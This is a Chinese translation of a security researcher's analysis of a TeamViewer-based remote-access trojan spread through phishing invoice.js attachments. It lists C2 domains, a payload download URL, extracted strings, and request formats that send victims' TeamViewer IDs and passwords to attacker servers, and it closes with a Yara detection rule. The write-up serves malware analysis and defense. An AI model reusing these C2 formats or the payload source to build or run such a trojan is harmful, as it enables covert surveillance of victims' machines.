> 原文链接: https://www.anquanke.com//post/id/87336 


# 【技术分享】基于TeamViewer的瞄准小公司的远控木马分析


                                阅读量   
                                **250214**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：benkowlab.blogspot.ca
                                <br>原文地址：[https://benkowlab.blogspot.ca/2017/11/rules-22-copypasta-is-made-to-ruin.html](https://benkowlab.blogspot.ca/2017/11/rules-22-copypasta-is-made-to-ruin.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t014be14061ef42d8ed.png)](https://p0.ssl.qhimg.com/t014be14061ef42d8ed.png)

译者：[eridanus96](http://bobao.360.cn/member/contribute?uid=2857535356)

预估稿费：120RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**



在对一些公共沙箱的样本研究过程中，我发现了一些不同寻常的请求：

```
[+] e2dbbc71f807717a49b74d19c155a0ae9cce7d6e74f24c63ea5d0ed81ddb24d6 GET -&gt; rpc2.gdn/start/includes/tasks.php?hwid=71D7D653-460A-8BE7-264F6AF5
[+] e2dbbc71f807717a49b74d19c155a0ae9cce7d6e74f24c63ea5d0ed81ddb24d6 POST -&gt; rpc2.gdn/start/inc.php/start/inc.php
[+] 0c4d34cd4a11960ff3f7d205a0196084700f8d6f171ea052f8c9563f9ddc2e2e GET -&gt; rpc2.gdn/start/includes/tasks.php?hwid=49C78CBD-165E-D0CF-474D92B
[+] 0c4d34cd4a11960ff3f7d205a0196084700f8d6f171ea052f8c9563f9ddc2e2e POST -&gt; rpc2.gdn/start/inc.php/start/inc.php
```

我们发现，这些应该是利用TeamViewer进行监视的活动。由此，我们就对这个基于TeamViewer的远控木马进行分析。

<br>

**控制端概述**

****

****首先，让我们从通常的控制端面板开始分析。它的界面十分简单，主页如下所示：

[![](https://p0.ssl.qhimg.com/t0116c74cb9d3dbf0ba.png)](https://p0.ssl.qhimg.com/t0116c74cb9d3dbf0ba.png)

通过这个界面，控制者可以看到是否有人连接到被感染的机器，并且可以得知连接者是否有摄像头、麦克风，还能获得其系统的基本信息。在这个CNC中，共有125台被控制的主机。

另一个页面是一些简单的设置：

[![](https://i.imgur.com/qLj2xcZ.png)](https://i.imgur.com/qLj2xcZ.png)

这些都是一些最简单的基础设置，但对于监控来说，已经足够了。接下来，我们进入到最有意思的部分，来深入分析一下它的代码。

<br>

**TeamViewer_Test_Pub**



我们此次分析的样本，源自一封钓鱼邮件中名为invoice.js的附件，其SHA-256值为e2dbbc71f807717a49b74d19c155a0ae9cce7d6e74f24c63ea5d0ed81ddb24d6。该JS脚本会通过store4caroption-support.info/KKK.exe（SHA值为0c4d34cd4a11960ff3f7d205a0196084700f8d6f171ea052f8c9563f9ddc2e2e）来在用户的电脑上安装木马。

该样本较为庞大，主要功能是在%APPDATA%对应的路径下的WebNet文件夹中，部署TeamViewer和恶意木马程序，上述文件夹和文件均为隐藏属性。

[![](https://p1.ssl.qhimg.com/t01ba7682e51c55c014.png)](https://p1.ssl.qhimg.com/t01ba7682e51c55c014.png)

SensApi.dll（833ff902452e5fb10b39ef90c2f1ec96beb0d8d0486dc378eb07c10b3672276c）是一个目标主机控制器。我们使用PEBear进行了一些简单的静态分析，发现这个dll有4个导出函数：

[![](https://i.imgur.com/fqU1jAX.png)](https://i.imgur.com/fqU1jAX.png)
<li>
Entrypoint
</li>
<li>
IsDestinationReachableA
</li>
<li>
IsDestinationReachableW
</li>
<li>
isNetworkAlive

</li>
我们又进一步发现，其中的IsDestinationReachableA、IsDestinationReachableW和isNetworkAlive只是作为sensApi.dll的封装。

[![](https://i.imgur.com/EGYB2cc.png)](https://i.imgur.com/EGYB2cc.png)

在跳到入口点（EntryPoint）之前，我们先简单看一下字符串：

```
rpc2.gdn
num1.gdn
process call create "%s"
runas
wmic
TV started from Admin!!!
uac
This OS is not supported!!!
PoliciesSystem
CurrentVersion
Windows
Microsoft
Software
%s%s%s%s%s
EnableLUA
Off
High (Always Notify)
Medium (Default Notification)
Low (Default Notification)
N/A
error args
Request successfully!!!
cmdshow
cmd
COMSPEC
/C
run error
wait...
error
closed. exitcode: %d (%s)
tasklist
(x64)
(Win32)
%s PID:%d%s
plugin_start
tiff
plugin_del
%s%s.%s
admin
Yes
UAC LVL: %s
Elevated: %s
RunAsAdmin: %s
AdminGroup: %s
webcam
mic
device is missing
device is available
off
*.tiff
Command not found!!!
Error
%s%s%s
%06lX-%04lX-%04lX-%06lX
%s%s
HTTP/1.0
Windows Server 2016
Windows 10
Windows Server 2012 R2
Windows 8.1
Windows Server 2012
Windows 8
Windows Server 2008 R2
Windows 7
Windows Server 2008
Windows Vista
Windows XP x64
Windows Server 2003
Windows XP
Windows 2000
unknown
TeamViewer
/start/includes/tasks.php?hwid=
hwid=%s
Content-Type: application/x-www-form-urlencoded
start/includes/act_user.php
hwid=%s&amp;tv_id=%s&amp;tv_pass=%s
start/includes/pass_tv.php
uuid=%s&amp;tv_id=%s&amp;tv_pass=%s&amp;winver=%s&amp;username=%s&amp;webcam=%sµ=%s
start/inc.php
start
.exe
open
IsDestinationReachableA
SensApi.dll
IsDestinationReachableW
IsNetworkAlive
SOFTWAREMicrosoftWindowsCurrentVersionRun
TeamViewer_Desktop.exe
Windows Core Services
%s%s
.log
.txt
.tmp
resource DLL
TeamViewer
TV_Marker
TVWidget
ATL:00BDE7D8
ATL:00BE38B8
```

这段代码非常冗长，并且会有一些经常出现的模式。我们发现，这段代码并不是处理TeamViewer的通常方法，因此我尝试先用Google搜索一下，看看诸如stackoverflow的一些函数是否是从其他地方拷贝而来的。通过搜索，我找到了一个奇怪的Github账户，其中的源代码与样本中的相匹配：

``[![](https://i.imgur.com/1cGiXSd.png)](https://i.imgur.com/1cGiXSd.png)``

``[![](https://i.imgur.com/BSB2qYt.png)](https://i.imgur.com/BSB2qYt.png)``



**`命令`**

**``**

**``**`我们在这个Github账户中更加深入的挖掘，与此同时也继续对这个木马样本进行分析。最终发现，木马控制器很有可能是一个fork，或者是一个从Github账户中更新源代码的工具。`

`我们发现了很多相似的函数：`

``[![](https://i.imgur.com/SpSUNsB.png)](https://i.imgur.com/SpSUNsB.png)``

``[![](https://i.imgur.com/3lNKlc5.png)](https://i.imgur.com/3lNKlc5.png)``

`该木马通过main.cpp中的RunCmd()函数来执行C2的命令。在两个版本中，有一些共同存在的命令：`

[![](https://p0.ssl.qhimg.com/t01319a1756294c8f39.png)](https://p0.ssl.qhimg.com/t01319a1756294c8f39.png)

正如我们所看到的，只有很少的命令是从Github代码中复制而来。其中，**最大的改动是如何处理高权限的进程（**Elevated **Process）和用户账户控制（UAC）**，因为Github上面的代码已经非常过时。

<br>

**C2通信**



这个木马与C2之间的通信似乎与众不同，它是通过HTTP的方式，以纯文本进行通信，Github上面的版本则是使用了模糊的HTTP请求。



```
/includes/tasks.php - GET hwid=%s<br>/includes/act_user.php - POST hwid=%s&amp;tv_id=%s&amp;tv_pass=%s<br>/includes/inc.php - POST uuid=%s&amp;tv_id=%s&amp;tv_pass=%s&amp;winver=%s&amp;username=%s&amp;webcam=%s&amp;mic=%s<br>
```

共有两个域名作为C2，分别是rpc2.gdn和num1.gdn。

值得注意的是，从TeamViewer部分和整体结构来看，我们所获得的样本似乎比Github代码的版本更高。这是一个非常基础的恶意软件，但它却非常有效，并且使用简单。在Github的自述文件中，提到了一个论坛，网址为[http://ander-pub.cc/forum/threads/isxodniki-skrytogo-teamviewer.73/](http://ander-pub.cc/forum/threads/isxodniki-skrytogo-teamviewer.73/) ，这个网站目前已经无法访问，因此我们也很好奇这是一个什么样的论坛。

<br>

**目标群体**

****

****从这个样本来看，攻击者的目标群体是中国、澳洲、美国和俄罗斯等国家的小型公司，我们发现有呼叫中心、会计事务所等。

以下是一个呼叫中心的示例：

[![](https://i.imgur.com/YE9qkpP.png)](https://i.imgur.com/YE9qkpP.png)

[![](https://i.imgur.com/TthQp3P.png)](https://i.imgur.com/TthQp3P.png)

**我们认为，这并不是是一个对特定国家进行攻击的木马，而是将目标锁定了在企业或者是金融等相关行业上。**

<br>

**总结**

****

****以上就是对该远控木马的分析，但我更加好奇的是这个恶意软件的背景如何，以及攻击者希望借助它实现的目的。该木马没有加壳，并且具有直观的界面，因此非常适合我们对其进行分析。

<br>

**恶意软件特征<br>**

****

****该木马的Yara规则如下：



```
/*<br>    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.<br>*/<br> <br>rule TeamViewerControlPanel : TeamViewerController<br>    `{`<br>            meta:<br>                    author = "@benkow_"<br>                    date = "2017-11-26"<br>                    reference = "https://benkowlab.blogspot.fr/2017/11/rules-22-copypasta-is-made-to-ruin.html"<br>            strings:<br>                    $mz = `{`4D 5A`}`<br>                    $string1 = `{`54 00 68 00 69 00 73 00 20 00 4F 00 53 00 20 00 69 00 73 00 20 00 6E 00 6F 00 74 00 20 00 73 00 75 00 70 00 70 00 6F 00 72 00 74 00 65 00 64 00 21 00 21 00 21 00 00 00`}`<br>                    $string2 = `{`54 00 56 00 20 00 73 00 74 00 61 00 72 00 74 00 65 00 64 00 20 00 66 00 72 00 6F 00 6D 00 20 00 41 00 64 00 6D 00 69 00  6E 00 21 00 21 00 21 00 00 `}`<br>                    $string3 = `{`52 00 65 00 71 00 75 00 65 00 73 00 74 00 20 00 73 00 75 00 63 00 63 00 65 00 73 00 73 00 66 00 75 00 6C 00 6C 00 79 00 21 00 21 00 21 00 00 00`}`<br>                    $string4 = "TeamViewer"<br>            condition:<br>                    ($mz at 0 and all of ($string*) )<br>`}`
```
